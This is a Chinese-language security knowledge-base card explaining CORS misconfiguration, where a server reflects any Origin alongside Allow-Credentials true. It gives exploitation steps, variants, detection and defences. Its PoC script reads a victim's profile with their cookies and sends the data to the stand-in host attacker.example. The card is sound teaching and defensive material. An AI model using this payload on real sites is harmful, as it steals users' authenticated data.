---
id: web-generic-cors-reflect-origin-credentials-read
title: 反射任意 Origin + Allow-Credentials true：跨域带凭证读取接口响应
type: scenario
domain: web
path: web/generic/cors
technique: cors-reflect-origin-credentials
tags:
- cors
- web
- same-origin-policy
- credentials
- origin-reflection
- data-exfiltration
- misconfiguration
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V475
  verified_at: '2026-11-10T17:39:57+08:00'
  notes: 已对照原文 CORS 段核对：Origin 回显到 Access-Control-Allow-Origin + Access-Control-Allow-Credentials true 即判定存在 CORS，与原文一致；卡内对 SameSite/预检/Vary 的补充为通用利用边界，PoC 为占位化 fetch 示例。同路径既有 OPTIONS 预检 oracle、MLflow DNS rebinding、Ollama 协议通配符三卡均非同一 sink，保留。未实测。
url: /docs/web/generic/cors/web-generic-cors-reflect-origin-credentials-read/
draft: false
kb_aliases:
- CORS 任意 Origin 反射
- ACAO 反射 Origin
- Access-Control-Allow-Credentials true
- 跨域带凭证读取
- CORS 配置错误
- Origin 白名单缺失
---

## 一句话结论

当服务端把请求头的 `Origin` 原样回填到 `Access-Control-Allow-Origin`，并同时返回 `Access-Control-Allow-Credentials: true` 时，任意攻击者站点都能用 `fetch(..., {credentials:'include'})` 带上受害者的 Cookie 跨域请求接口并读取响应，同源策略保护失效，可批量窃取登录态下的 PII/业务数据。

## 原理

- **同源策略与 CORS**：浏览器默认禁止脚本读取跨域响应；CORS 通过 `Access-Control-Allow-Origin`（ACAO）等响应头选择性放行。ACAO 若是通配符 `*`，浏览器不允许与凭证一起使用；只有"具体 Origin + `Access-Control-Allow-Credentials: true`（ACAC）"组合才会在携带 Cookie 的请求中放行响应。
- **反射式配置错误**：服务端为了支持多域名，直接把请求的 `Origin` 值写回 ACAO（或按"包含/前缀/正则"松散匹配），等于对任意来源放行；再加 ACAC true，攻击者页面即可读取受害者登录态下的响应。
- **预检的影响**：简单请求（GET/POST + 安全 Content-Type）直接发送；带自定义头、PUT/DELETE、`application/json` 的请求会先发 OPTIONS 预检，需要服务端同时放行方法和头。很多反射配置连预检也一并放行。
- **SameSite 边界**：现代浏览器默认 `SameSite=Lax`，跨站 fetch/XHR 通常不带 Cookie；要利用成功需要目标 Cookie 为 `SameSite=None; Secure`，或攻击页面与目标同站（例如任意子域上的内容注入/上传 HTML、同站第三方页面）。因此"存在 CORS 配置错误"与"实际可带凭证读数据"之间还要看 Cookie 属性。
- **影响**：读取用户资料、订单、CSRF Token、内部接口数据；配合写操作接口可造成越权操作。危害取决于接口数据敏感度与 Cookie 属性。

## 触发条件

- 响应 `Access-Control-Allow-Origin` 随请求 `Origin` 变化（反射任意来源），且 `Access-Control-Allow-Credentials: true`。
- 目标接口在登录态下返回敏感数据，且未额外要求 CSRF Token 等不可跨域获取的凭证。
- 目标 Cookie 为 `SameSite=None; Secure`，或攻击者能从同站来源发起请求。
- 预检（如有）放行攻击者使用的方法与请求头。

## 利用步骤

1. 基线测试：对目标接口发送 `Origin: https://attacker.example`，观察响应是否返回相同的 `Access-Control-Allow-Origin` 与 `Access-Control-Allow-Credentials: true`，并确认 `Vary: Origin` 是否存在（缺失说明可能被缓存放大）。
2. 判断请求类型：若为简单请求可直接跨域发送；若需要 JSON/自定义头，先看 OPTIONS 预检是否放行 `Access-Control-Request-Method/Headers`。
3. 在攻击者页面用 `fetch`/XHR 携带 `credentials:'include'` 请求目标接口，读取响应文本。
4. 将读到的数据外带到攻击者服务器；若接口返回 CSRF Token，可继续构造写操作请求。
5. 若跨站 Cookie 受 SameSite=Lax 限制，改从同站来源（子域内容注入、上传的 HTML、同站第三方页面）发起，或寻找 `SameSite=None` 的会话 Cookie。
6. 记录请求/响应头与读取到的数据作为证据，验证后停止。

## PoC

```html
<!-- 攻击者页面：跨域带凭证读取并外带 -->
<script>
fetch('https://victim.example/api/user/profile', {
  method: 'GET',
  credentials: 'include'
}).then(r => r.text()).then(d => {
  new Image().src = 'https://attacker.example/collect?d=' + encodeURIComponent(d);
});
</script>
```

```http
GET /api/user/profile HTTP/1.1
Host: victim.example
Origin: https://attacker.example
Cookie: SESSION=<victim>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
Content-Type: application/json
```

说明：仅用于授权测试；未对真实站点执行。

## 变体与关联

- 变体：`Origin: null`（sandbox iframe/data: 页面）被放行；域名后缀/前缀匹配过宽（`attacker-victim.com`、`victim.com.attacker.com`）；仅校验 `Origin` 是否包含目标字符串。
- 变体：ACAO 为 `*` 且接口无需 Cookie 时，匿名数据仍可被任意站点读取；ACAC true 与 `*` 组合会被浏览器拒绝，但反射配置不会。
- [[web-generic-cors-options-preflight-authz-oracle]]：预检处理不当导致方法/请求头枚举；本卡关注反射 Origin + 凭证读取。
- [[web-generic-csrf-json-text-plain-form-enctype]]：不能读响应时用 CSRF 盲打写操作；CORS 错误可直接读响应，危害更高。
- 边界：`SameSite=Lax` Cookie、CSP/沙箱、浏览器对私有网络请求（PNA）的限制都会影响利用；响应缓存缺少 `Vary: Origin` 时可能把带 ACAO 的响应缓存给其他来源。

## 检测与防御

- 检测：响应 ACAO 与请求 Origin 完全一致且 ACAC true；ACAO 动态变化、缺少 `Vary: Origin`；日志中同一接口被大量不同 Origin 访问。
- 防御：使用严格的白名单匹配（完整 scheme+host+port），不要反射 Origin 或做包含/前缀匹配；仅在确有跨域需求时返回 ACAC true；响应加 `Vary: Origin` 防止缓存串味；会话 Cookie 使用 `SameSite=Lax/Strict`；不要把 CORS 当作访问控制，敏感接口仍需鉴权与 CSRF 防护。
